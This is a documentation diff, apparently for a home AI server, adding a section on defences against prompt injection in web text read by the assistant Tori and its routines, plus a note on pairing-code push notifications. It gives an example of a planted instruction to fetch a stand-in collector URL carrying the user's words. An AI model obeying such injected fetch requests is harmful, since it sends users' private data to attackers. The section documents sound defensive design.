@@ -158,6 +158,32 @@ restarted here" and offers Restart now. A box reboot restarts containers as they
 (`tt launch`'s Open WebUI and AnythingLLM, under "Chat for everyone", are separate: they
 are meant for the household and stay on the network.)
 
+### Web text in Tori and routines
+
+Text from the web (a search, a page read) can be written to steer the model. Once it has
+come into a Tori turn or a routine run:
+
+- **Acting steps wait for a person.** Tori asks before `remember`, opening things, starting
+  research and the like. A routine, which nobody may be watching, doesn't run them: it
+  queues each one (its actions too, even ones it was given ahead of time) with a
+  notification, carries on, and its report ends with what's waiting. An allowed step runs
+  when it's answered (within a day); a declined one is dropped.
+- **New web addresses wait for a person.** A page can ask the model to fetch
+  `https://collector.example/?q=<what you said>`, and the request itself carries the data
+  away. So an address is fetched or opened without asking only if it was in the person's
+  own messages (a routine's goal counts) or came back from a search or page in that same
+  turn. A parent of one of those is fine; one with a query or path segment none of them
+  had is new. Research jobs only read their searches' results.
+- **Not covered:** the words of a web search itself (`web_search`'s query goes to the
+  search engine), and agents with their own tools (Code sessions, Hermes, OpenClaw).
+
+### Pairing codes and push notifications
+
+A push notification's text passes through Apple. When another computer asks to pair, the
+push says only "A computer is asking to pair: open TT Station to see the code"; the code is
+shown in TT Station (the desktop app, and the phone app's banner while it's open), which
+reads it from the box over its authenticated connection (`GET /events`).
+
 ---
 
 ## FAQ
